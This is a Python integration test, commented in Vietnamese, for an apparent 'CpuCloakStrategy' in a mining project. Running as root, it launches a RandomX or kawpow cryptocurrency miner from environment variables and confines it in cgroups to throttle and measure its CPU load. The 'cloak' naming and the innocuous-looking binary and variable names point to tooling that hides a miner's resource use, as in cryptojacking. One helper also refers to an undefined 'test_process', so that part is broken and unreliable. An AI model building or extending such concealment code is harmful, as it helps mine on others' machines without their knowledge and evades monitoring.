# test_cpu_cloak_strategy.py

import logging
import time
import psutil
import subprocess
import os
import traceback
from threading import Event, Thread
from mining_environment.scripts.cloak_strategies import CpuCloakStrategy

def setup_logging():
    """
    Thiết lập logger để ghi log vào console với mức độ DEBUG.
    
    Returns:
        logging.Logger: Đối tượng logger đã được cấu hình.
    """
    logger = logging.getLogger("RuntimeIntegrationTest")
    logger.setLevel(logging.DEBUG)  # Đặt mức log là DEBUG để xem tất cả các thông báo
    
    # Tạo handler để ghi log vào console
    handler = logging.StreamHandler()
    handler.setLevel(logging.DEBUG)
    
    # Định dạng log
    formatter = logging.Formatter('%(asctime)s [%(levelname)s] %(message)s')
    handler.setFormatter(formatter)
    
    # Thêm handler vào logger
    logger.addHandler(handler)
    
    return logger

# Khởi tạo stop_event để dừng các tiến trình nếu cần
stop_event = Event()

def start_mining_process(cpu=True, retries=3, delay=5, logger=None):
    """
    Khởi động quá trình khai thác CPU/GPU với cơ chế thử lại.
    
    Args:
        cpu (bool): Nếu True, khai thác CPU; ngược lại, khai thác GPU.
        retries (int): Số lần thử lại nếu khởi động thất bại.
        delay (int): Thời gian đợi giữa các lần thử (giây).
        logger (logging.Logger): Đối tượng logger để ghi log.
    
    Returns:
        subprocess.Popen: Đối tượng tiến trình đã được khởi chạy hoặc None nếu thất bại.
    """
    if logger is None:
        logger = logging.getLogger("RuntimeIntegrationTest")
    
    executable = os.getenv('ML_COMMAND' if cpu else 'CUDA_COMMAND')
    if not executable:
        logger.error(f"Biến môi trường {'ML_COMMAND' if cpu else 'CUDA_COMMAND'} không được thiết lập.")
        stop_event.set()
        return None

    if not os.path.isfile(executable) or not os.access(executable, os.X_OK):
        logger.error(f"Tệp thực thi khai thác không hợp lệ hoặc không có quyền: {executable}")
        stop_event.set()
        return None

    mining_server = os.getenv('MINING_SERVER_CPU' if cpu else 'MINING_SERVER_GPU')
    mining_wallet = os.getenv('MINING_WALLET_CPU' if cpu else 'MINING_WALLET_GPU')
    if not mining_server or not mining_wallet:
        logger.error("Biến môi trường MINING_SERVER hoặc MINING_WALLET không được thiết lập.")
        stop_event.set()
        return None

    mining_command = [
        executable,
        '-o', mining_server,
        '-u', mining_wallet,
        '--tls'
    ]
    if cpu:
        mining_command.extend(['-a', 'rx/0', '--no-huge-pages'])
    else:
        cuda_loader = os.getenv('MLLS_CUDA', '/usr/local/bin/libmlls-cuda.so')
        mining_command.extend(['--cuda', f'--cuda-loader={cuda_loader}', '-a', 'kawpow'])

    for attempt in range(1, retries + 1):
        logger.info(f"Thử khởi chạy quá trình khai thác {'CPU' if cpu else 'GPU'} (Lần {attempt}/{retries})...")
        try:
            process = subprocess.Popen(
                mining_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            logger.info(f"Quá trình khai thác {'CPU' if cpu else 'GPU'} đã được khởi động với PID: {process.pid}")

            time.sleep(2)
            if process.poll() is not None:
                stdout, stderr = process.communicate()
                logger.error(f"Quá trình khai thác {'CPU' if cpu else 'GPU'} kết thúc sớm.")
                if stdout:
                    logger.error(f"STDOUT: {stdout.decode().strip()}")
                if stderr:
                    logger.error(f"STDERR: {stderr.decode().strip()}")
                process = None
            else:
                return process
        except Exception as e:
            logger.error(f"Lỗi khi khởi động quá trình khai thác {'CPU' if cpu else 'GPU'}: {e}")
            process = None

        if attempt < retries:
            logger.info(f"Đợi {delay} giây trước khi thử lại...")
            time.sleep(delay)

    logger.error(f"Không thể khởi chạy quá trình khai thác {'CPU' if cpu else 'GPU'}.")
    stop_event.set()
    return None

def monitor_cpu_usage(pid, interval=1, duration=10, logger=None):
    """
    Giám sát mức sử dụng CPU của một tiến trình trong một khoảng thời gian nhất định.
    
    Args:
        pid (int): ID của tiến trình cần giám sát.
        interval (int, optional): Khoảng thời gian giữa các lần đo (giây). Mặc định là 1 giây.
        duration (int, optional): Tổng thời gian giám sát (giây). Mặc định là 10 giây.
        logger (logging.Logger, optional): Đối tượng logger để ghi log.
    
    Returns:
        List[float]: Danh sách các mức sử dụng CPU (%) theo từng khoảng thời gian.
    """
    usage = []
    if logger is None:
        logger = logging.getLogger("RuntimeIntegrationTest")
    try:
        p = psutil.Process(pid)
        for _ in range(duration):
            if stop_event.is_set():
                logger.warning("Dừng giám sát CPU do stop_event được kích hoạt.")
                break
            cpu = p.cpu_percent(interval=interval)
            usage.append(cpu)
            logger.debug(f"PID {pid} CPU usage: {cpu}%")
    except psutil.NoSuchProcess:
        logger.warning(f"Tiến trình với PID {pid} đã kết thúc.")
    except Exception as e:
        logger.error(f"Lỗi khi giám sát CPU usage cho PID {pid}: {e}")
    return usage

def setup_cgroups_for_process(cpu_cloak_strategy, process, logger):
    """
    Thiết lập cgroups cho tiến trình khai thác.
    
    Args:
        cpu_cloak_strategy (CpuCloakStrategy): Đối tượng chiến lược cloaking CPU.
        process (subprocess.Popen): Đối tượng tiến trình khai thác.
        logger (logging.Logger): Đối tượng logger để ghi log.
    
    Returns:
        Dict[str, Any]: Các điều chỉnh đã áp dụng.
    """
    try:
        adjustments = cpu_cloak_strategy.apply(process)
        logger.info(f"Các điều chỉnh đã áp dụng: {adjustments}")
        return adjustments
    except Exception as e:
        logger.error(f"Lỗi khi áp dụng cgroups cho tiến trình khai thác: {e}\n{traceback.format_exc()}")
        raise

def run_tasks_with_cloak(cpu_cloak_strategy, tasks, task_func, logger):
    """
    Chạy các nhiệm vụ với chiến lược cloaking CPU áp dụng.
    
    Args:
        cpu_cloak_strategy (CpuCloakStrategy): Đối tượng chiến lược cloaking CPU.
        tasks (List[int]): Danh sách ID nhiệm vụ.
        task_func (Callable): Hàm thực thi nhiệm vụ.
        logger (logging.Logger): Đối tượng logger để ghi log.
    """
    try:
        # Áp dụng CpuCloakStrategy cho tiến trình kiểm thử
        adjustments = cpu_cloak_strategy.apply(test_process)
        logger.info(f"Các điều chỉnh đã áp dụng: {adjustments}")
        
        # Giám sát CPU usage trước khi chạy các nhiệm vụ
        logger.info("Bắt đầu giám sát CPU usage trước khi chạy các nhiệm vụ...")
        pre_throttle_usage = monitor_cpu_usage(test_process.pid, interval=1, duration=5, logger=logger)
        logger.info(f"CPU usage trước throttling: {pre_throttle_usage}")
        
        # Chạy các nhiệm vụ với throttling áp dụng
        logger.info("Bắt đầu chạy các nhiệm vụ với throttling áp dụng...")
        cpu_cloak_strategy.run_tasks(tasks, task_func)
        logger.info("Đã hoàn thành tất cả các nhiệm vụ.")
        
        # Giám sát CPU usage sau khi chạy các nhiệm vụ
        logger.info("Bắt đầu giám sát CPU usage sau khi chạy các nhiệm vụ...")
        post_throttle_usage = monitor_cpu_usage(test_process.pid, interval=1, duration=5, logger=logger)
        logger.info(f"CPU usage sau throttling: {post_throttle_usage}")
        
        # So sánh mức sử dụng CPU trước và sau khi throttling
        if pre_throttle_usage and post_throttle_usage:
            avg_pre = sum(pre_throttle_usage) / len(pre_throttle_usage)
            avg_post = sum(post_throttle_usage) / len(post_throttle_usage)
            logger.info(f"Trung bình CPU usage trước throttling: {avg_pre}%")
            logger.info(f"Trung bình CPU usage sau throttling: {avg_post}%")
            
            if avg_post < avg_pre:
                logger.info("Throttling CPU thành công: CPU usage đã giảm.")
            else:
                logger.warning("Throttling CPU không hiệu quả: CPU usage không giảm.")
        else:
            logger.warning("Không thể so sánh CPU usage trước và sau throttling.")
    
    except Exception as e:
        logger.error(f"Lỗi trong quá trình kiểm thử: {e}\n{traceback.format_exc()}")

def main():
    """
    Hàm chính để thực hiện Runtime Integration Test cho lớp CpuCloakStrategy.
    """
    logger = setup_logging()
    
    # Cấu hình cho CpuCloakStrategy
    config = {
        'throttle_percentage': 20,         # Giới hạn sử dụng CPU còn lại ~80%
        'max_concurrent_threads': 4,       # Cho phép tối đa 4 luồng đồng thời
        'max_calls_per_second': 5,         # Cho phép tối đa 5 nhiệm vụ mỗi giây
        'cache_enabled': True              # Bật tính năng caching
    }
    
    # Khởi tạo CpuCloakStrategy
    cpu_cloak_strategy = CpuCloakStrategy(config, logger)
    
    # Bắt đầu tiến trình khai thác CPU/GPU
    # Bạn có thể thay đổi cpu=False để khai thác GPU
    mining_process = start_mining_process(cpu=True, retries=3, delay=5, logger=logger)
    
    if not mining_process:
        logger.error("Không thể khởi động tiến trình khai thác. Kết thúc kiểm thử.")
        return
    
    try:
        # Áp dụng CpuCloakStrategy cho tiến trình khai thác
        adjustments = setup_cgroups_for_process(cpu_cloak_strategy, mining_process, logger)
        
        # Giám sát CPU usage trước khi chạy các nhiệm vụ
        logger.info("Bắt đầu giám sát CPU usage trước khi chạy các nhiệm vụ...")
        pre_throttle_usage = monitor_cpu_usage(mining_process.pid, interval=1, duration=5, logger=logger)
        logger.info(f"CPU usage trước throttling: {pre_throttle_usage}")
        
        # Định nghĩa hàm nhiệm vụ CPU-intensive
        def cpu_intensive_task(task_id):
            """
            Một nhiệm vụ CPU-intensive để kiểm thử.
            
            Args:
                task_id (int): ID của nhiệm vụ.
            
            Returns:
                str: Kết quả của nhiệm vụ.
            """
            logger.info(f"Đang xử lý nhiệm vụ {task_id}...")
            # Thực hiện một vòng lặp để tạo tải CPU
            for _ in range(1000000):
                pass
            time.sleep(1)  # Giả lập thời gian chờ
            return f"Kết quả của nhiệm vụ {task_id}"
        
        # Danh sách ID nhiệm vụ để chạy
        tasks = list(range(10))
        
        # Chạy các nhiệm vụ với throttling áp dụng
        logger.info("Bắt đầu chạy các nhiệm vụ với throttling áp dụng...")
        cpu_cloak_strategy.run_tasks(tasks, cpu_intensive_task)
        logger.info("Đã hoàn thành tất cả các nhiệm vụ.")
        
        # Giám sát CPU usage sau khi chạy các nhiệm vụ
        logger.info("Bắt đầu giám sát CPU usage sau khi chạy các nhiệm vụ...")
        post_throttle_usage = monitor_cpu_usage(mining_process.pid, interval=1, duration=5, logger=logger)
        logger.info(f"CPU usage sau throttling: {post_throttle_usage}")
        
        # So sánh mức sử dụng CPU trước và sau khi throttling
        if pre_throttle_usage and post_throttle_usage:
            avg_pre = sum(pre_throttle_usage) / len(pre_throttle_usage)
            avg_post = sum(post_throttle_usage) / len(post_throttle_usage)
            logger.info(f"Trung bình CPU usage trước throttling: {avg_pre}%")
            logger.info(f"Trung bình CPU usage sau throttling: {avg_post}%")
            
            if avg_post < avg_pre:
                logger.info("Throttling CPU thành công: CPU usage đã giảm.")
            else:
                logger.warning("Throttling CPU không hiệu quả: CPU usage không giảm.")
        else:
            logger.warning("Không thể so sánh CPU usage trước và sau throttling.")
    
    except Exception as e:
        logger.error(f"Lỗi trong quá trình kiểm thử: {e}\n{traceback.format_exc()}")
    
    finally:
        # Kết thúc tiến trình khai thác
        try:
            mining_process.terminate()
            mining_process.wait(timeout=5)
            logger.info(f"Đã kết thúc tiến trình khai thác PID {mining_process.pid}.")
        except Exception as e:
            logger.error(f"Lỗi khi kết thúc tiến trình khai thác: {e}")
        
        # Xóa các cgroup đã tạo để làm sạch môi trường (nếu có)
        try:
            cpu_cgroup = f"cpu_cloak_{mining_process.pid}"
            cpuset_cgroup = f"cpuset_cloak_{mining_process.pid}"
            
            # Xóa cgroup CPU
            subprocess.run(['cgdelete', '-g', f'cpu:/{cpu_cgroup}'], check=True)
            logger.info(f"Đã xóa cgroup CPU '{cpu_cgroup}'.")
            
            # Xóa cgroup cpuset
            subprocess.run(['cgdelete', '-g', f'cpuset:/{cpuset_cgroup}'], check=True)
            logger.info(f"Đã xóa cgroup cpuset '{cpuset_cgroup}'.")
            
        except subprocess.CalledProcessError as e:
            logger.error(f"Lỗi khi xóa cgroup: {e.stderr}")
        except Exception as e:
            logger.error(f"Lỗi bất ngờ khi xóa cgroup: {e}")
        
        logger.info("Đã hoàn thành Runtime Integration Test.")

if __name__ == "__main__":
    # Kiểm tra quyền root trước khi chạy test
    if os.geteuid() != 0:
        print("Bạn cần chạy script này với quyền root (sudo).")
        exit(1)
    
    main()
